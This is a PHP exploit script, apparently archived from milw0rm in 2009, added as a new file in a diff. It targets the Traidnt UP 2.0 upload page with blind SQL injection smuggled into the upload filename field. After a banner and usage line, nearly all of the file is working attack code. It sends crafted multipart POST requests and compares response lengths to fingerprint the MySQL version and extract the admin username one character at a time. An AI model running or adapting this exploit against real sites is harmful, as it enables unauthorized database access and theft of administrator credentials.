@@ -1,0 +1,237 @@
+<?php
+print_r('
+                                       ||          ||   | ||
+                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
+                               (  :  /    (_)    /           (      .
+
+                                        ___________________
+                                      _/QQQQQQQQQQQQQQQQQQQ\__
+[q] Traidnt UP 2.0 Blind SQL Inj.  __/QQQ/````````````````\QQQ\___
+                                 _/QQQQQ/                  \QQQQQQ\
+[q] _FILES <3                   /QQQQ/``                    ```QQQQ\
+                               /QQQQ/                          \QQQQ\
+[q] Magic Quotes == OFF!      |QQQQ/    By  Qabandi             \QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+[/]   -[WHAT?]-                \QQQQ\                      __  /QQQQ/
+                                \QQQQ\                    /QQ\_QQQQ/
+                                 \QQQQ\                   \QQQQQQQ/
+                                  \QQQQQ\                 /QQQQQ/_
+                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                         ```````````````````     `````
+ ______________________________________________________________________________
+/                                                                              \
+|      Sec-Code.com ;)  Shru7at Iktshaf al-thaghrat Qareeban!!il7ag sajjil!!   |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+USAGE: php whatever.php localhost /upload/
+
+Will give you username and mysql version ONLY ;)
+');
+
+ini_set("max_execution_time",0);
+
+ function QABANDI($victim,$vic_dir,$injection){
+$host = $victim;
+$p = "http://".$host.$vic_dir;
+$inj = $injection;
+$content="qabandi";
+
+$data='-----------------------------7d529a1d23092a
+Content-Disposition: form-data; name="upfile_0"; filename="q.jpg'.$inj.'"
+Content-Type: image/jpg
+
+'.$content.'
+-----------------------------7d529a1d23092a
+Content-Disposition: form-data; name="tr_upload"
+
+upload
+-----------------------------7d529a1d23092a--
+';
+
+
+
+
+          $packet ="POST ".$p."/upload.php?upload_range=1 HTTP/1.0\r\n";
+          $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+          $packet.="Pragma: no-cache\r\n";
+          $packet.="Content-Length: ".strlen($data)."\r\n";
+          $packet.="Connection: Close\r\n\r\n";
+          $packet.=$data;
+
+
+         //print $packet;
+	$o = @fsockopen($host, 80);
+	if(!$o){
+		echo "\n[x] No response...\n";
+		die;
+	}
+	
+	fputs($o, $packet);
+	while (!feof($o)) $data .= fread($o, 1024);
+	fclose($o);
+	
+	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
+	if ( !empty($_404) ){
+		echo "\n[x] 404 Not Found... Make sure of path. \n";
+		die;
+	}
+
+                                           return $data;
+
+ }
+
+$host1 = $argv[1];
+$userdir1=$argv[2];
+
+
+$Truths = strlen(QABANDI($host1,$userdir1,"' and 1='1"));
+
+//echo "truths = ".round($Truths, -3);
+$yes = round($Truths, -3);
+
+$Falses = strlen(QABANDI($host1,$userdir1,"' and 1='q"));
+
+//echo "\nfalses = ".round($Falses, -3);
+
+$no = round($Falses, -3);
+
+if($yes == $no){
+  echo "Website not vulnerable\nMagic quotes Must be OFF!";
+  die;
+}
+echo "\n MySQL version =";
+
+$sql4 = "' and substring(@@version,1,1)='4";
+$sql5 = "' and substring(@@version,1,1)='5";
+
+$myver4 = strlen(QABANDI($host1,$userdir1,$sql4));
+$myver4 = round($myver4, -3);
+
+
+$myver5 = strlen(QABANDI($host1,$userdir1,$sql5));
+$myver5 = round($myver5, -3);
+
+if( $myver5 == $yes ){
+  echo "5";
+}
+if( $myver4 == $yes ){
+ echo "4";
+}
+
+
+
+ echo "\n Username: ";
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),1,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),2,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),3,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),4,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+    for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),5,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),6,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),7,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),8,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),9,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+   for ($i = 46; $i <= 122; $i++) {
+ $ass = "' and ascii(substring((select admin_user from admin limit 0,1),10,1))='".$i;
+      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
+      $zyklon = round($zyklon, -3);
+
+      if($zyklon == $yes){
+       echo chr($i);
+      }
+   }
+
+die;
+
+
+?>
+
+# milw0rm.com [2009-07-14]
